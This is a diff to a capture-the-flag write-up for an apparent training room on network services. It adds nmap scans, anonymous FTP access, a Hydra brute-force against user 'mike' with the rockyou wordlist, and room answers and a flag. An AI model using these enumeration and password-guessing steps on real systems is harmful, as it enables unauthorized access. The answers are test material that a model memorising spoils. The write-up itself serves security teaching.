@@ -492,7 +492,7 @@ valuable information. Who can we assume this profile folder belongs to?
 smb: \> more "Working From Home Information.txt"
 John Cactus,
 
-As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
+As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever
 possible, employees should work from home. As such- your account has now been enabled with ssh
 access to the main server.
 
@@ -501,7 +501,7 @@ If there are any problems, please contact the IT department at it@polointernalco
 Regards,
 
 James
-Department Manager 
+Department Manager
 
 /tmp/smbmore.iqqVTz (END)
 ```
@@ -667,7 +667,7 @@ How many ports are open on the target machine?
 
 ```bash
 ❯ export ip=10.10.234.88
-# (Adding the -p- flag means all ports get checked instead of just the first 1000, 
+# (Adding the -p- flag means all ports get checked instead of just the first 1000,
 # the -T5 flag makes the process quite a bit quicker).
 ❯ nmap $ip -p- -vv -T5
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-01 10:13 +03
@@ -787,8 +787,8 @@ Host is up (0.072s latency).
 
 PORT     STATE SERVICE VERSION
 8012/tcp open  unknown
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
 |_    SKIDY'S BACKDOOR. Type .HELP to view commands
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port8012-TCP:V=7.94SVN%I=7%D=6/1%Time=683C0817%P=x86_64-pc-linux-gnu%r(
@@ -1149,15 +1149,15 @@ is one of a number of standards agencies, who define and regulate internet stand
 
 What communications model does FTP use?
 
-***Correct answer:***
+***Correct answer: client-server***
 
 What's the standard FTP port?
 
-***Correct answer:***
+***Correct answer: 21***
 
 How many modes of FTP connection are there?
 
-***Correct answer:***
+***Correct answer: 2***
 
 ## Task 9: Enumerating FTP
 
@@ -1209,15 +1209,67 @@ Now we understand our toolbox, let's do this.
 Run an nmap scan of your choice.
 How many ports are open on the target machine?
 
-***Correct answer:***
+*Solution:*
+
+```bash
+❯ export ip=10.10.64.101 # target machine IP
+❯ sudo nmap -sS -T4 -vvv $ip
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-17 10:49 +03
+Initiating Ping Scan at 10:49
+Scanning 10.10.64.101 [4 ports]
+Completed Ping Scan at 10:49, 0.08s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 10:49
+Completed Parallel DNS resolution of 1 host. at 10:49, 0.02s elapsed
+DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 10:49
+Scanning 10.10.64.101 [1000 ports]
+Discovered open port 21/tcp on 10.10.64.101
+Discovered open port 80/tcp on 10.10.64.101
+Increasing send delay for 10.10.64.101 from 0 to 5 due to 341 out of 852 dropped probes since last increase.
+Increasing send delay for 10.10.64.101 from 5 to 10 due to 11 out of 22 dropped probes since last increase.
+Completed SYN Stealth Scan at 10:49, 5.19s elapsed (1000 total ports)
+Nmap scan report for 10.10.64.101
+Host is up, received echo-reply ttl 63 (0.067s latency).
+Scanned at 2025-06-17 10:49:51 +03 for 5s
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 5.36 seconds
+           Raw packets sent: 1493 (65.668KB) | Rcvd: 1001 (40.036KB)
+```
+
+Then scan port 21 specifically with a script
+
+```bash
+❯ nmap -sV -p 21 --script=ftp-anon $ip
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-17 10:55 +03
+Nmap scan report for 10.10.64.101
+Host is up (0.074s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
+Service Info: Host: Welcome
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.11 seconds
+```
+
+Now we can see "vsftpd 2.0.8 or later".
+
+***Correct answer: 2***
 
 What port is ftp running on?
 
-***Correct answer:***
+***Correct answer: 21***
 
 What variant of FTP is running on it?
 
-***Correct answer:***
+***Correct answer: vsftpd***
 
 Great, now we know what type of FTP server we're dealing with we can check to see if we
 are able to login anonymously to the FTP server. We can do this using by typing
@@ -1225,11 +1277,64 @@ are able to login anonymously to the FTP server. We can do this using by typing
 
 What is the name of the file in the anonymous FTP directory?
 
-***Correct answer:***
+*Solution:*
+
+```bash
+❯ ftp $ip
+Connected to 10.10.64.101.
+220 Welcome to the administrator FTP service.
+Name (10.10.64.101:spam): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||60095|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
+226 Directory send OK.
+ftp>
+```
+
+***Correct answer: PUBLIC_NOTICE.txt***
 
 What do we think a possible username could be?
 
-***Correct answer:***
+*Solution:* Download it, then open it on our PC:
+
+```bash
+ftp> get PUBLIC_NOTICE.txt
+local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
+229 Entering Extended Passive Mode (|||50739|)
+150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
+100% |******************************************|   353        4.20 MiB/s    00:00 ETA
+226 Transfer complete.
+353 bytes received in 00:00 (4.77 KiB/s)
+```
+
+```bash
+❯ cat PUBLIC_NOTICE.txt
+===================================
+MESSAGE FROM SYSTEM ADMINISTRATORS
+===================================
+
+Hello,
+
+I hope everyone is aware that the
+FTP server will not be available
+over the weekend- we will be
+carrying out routine system
+maintenance. Backups will be
+made to my account so I reccomend
+encrypting any sensitive data.
+
+Cheers,
+
+Mike
+```
+
+***Correct answer: mike***
 
 Great! Now we've got details about the FTP server and, crucially,
 a possible username. Let's see what we can do with that...
@@ -1292,16 +1397,96 @@ Let's crack some passwords!
 
 What is the password for the user "mike"?
 
-***Correct answer:***
+*Solution:*
+
+First we need the `rockyou.txt` file, since it's not included on Ubuntu.
+It's a large archive file about 50MB. Unzipped, it's 133MB.
+We extract the archive and move it to `/usr/share/wordlists`.
+It needs read permissions to be used by Hydra.
+
+```bash
+❯ git clone https://github.com/zacheller/rockyou/
+Clonando en 'rockyou'...
+remote: Enumerating objects: 7, done.
+remote: Counting objects: 100% (1/1), done.
+remote: Total 7 (delta 0), reused 0 (delta 0), pack-reused 6 (from 1)
+Recibiendo objetos: 100% (7/7), 50.84 MiB | 586.00 KiB/s, listo.
+Resolviendo deltas: 100% (1/1), listo.
+❯ cd rockyou
+    .git/    README.md     rockyou.txt.tar.gz
+❯ tar -xzvf rockyou.txt.tar.gz
+rockyou.txt
+❯ sudo mkdir /usr/share/wordlists
+❯ sudo cp rockyou.txt /usr/share/wordlists/rockyou.txt
+❯ sudo chmod a+r /usr/share/wordlists/rockyou.txt
+```
+
+Now we can use Hydra:
+
+```bash
+❯ export ip=10.10.64.101 # target machine IP
+❯ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV $ip ftp
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-17 11:24:04
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
+[DATA] attacking ftp://10.10.27.72:21/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target 10.10.27.72 - login "mike" - pass "123456" - 1 of 14344398 [child 0] (0/0)
+[ATTEMPT] target 10.10.27.72 - login "mike" - pass "12345" - 2 of 14344398 [child 1] (0/0)
+[ATTEMPT] target 10.10.27.72 - login "mike" - pass "123456789" - 3 of 14344398 [child 2] (0/0)
+[ATTEMPT] target 10.10.27.72 - login "mike" - pass "password" - 4 of 14344398 [child 3] (0/0)
+[21][ftp] host: 10.10.27.72   login: mike   password: password
+[STATUS] attack finished for 10.10.27.72 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-17 11:24:09
+```
+
+***Correct answer: password***
 
 Bingo! Now, let's connect to the FTP server as this user using
 "`ftp [IP]`" and entering the credentials when prompted.
+
+*Solution:*
+
+```bash
+❯ ftp $ip
+Connected to 10.10.27.72.
+220 Welcome to the administrator FTP service.
+Name (10.10.27.72:spam): mike
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||48086|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
+-rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
+226 Directory send OK.
+ftp> get ftp.txt
+local: ftp.txt remote: ftp.txt
+229 Entering Extended Passive Mode (|||62913|)
+150 Opening BINARY mode data connection for ftp.txt (26 bytes).
+100% |******************************************|    26       22.42 KiB/s    00:00 ETA
+226 Transfer complete.
+26 bytes received in 00:00 (0.34 KiB/s)
+ftp>
+```
 
 ***Correct answer: No answer needed***
 
 What is `ftp.txt`?
 
-***Correct answer:***
+*Solution:*
+
+```bash
+❯ cat ftp.txt
+THM{y0u_g0t_th3_ftp_fl4g}
+```
+
+***Correct answer: THM{y0u_g0t_th3_ftp_fl4g}***
 
 ## Task 11: Expanding Your Knowledge
 
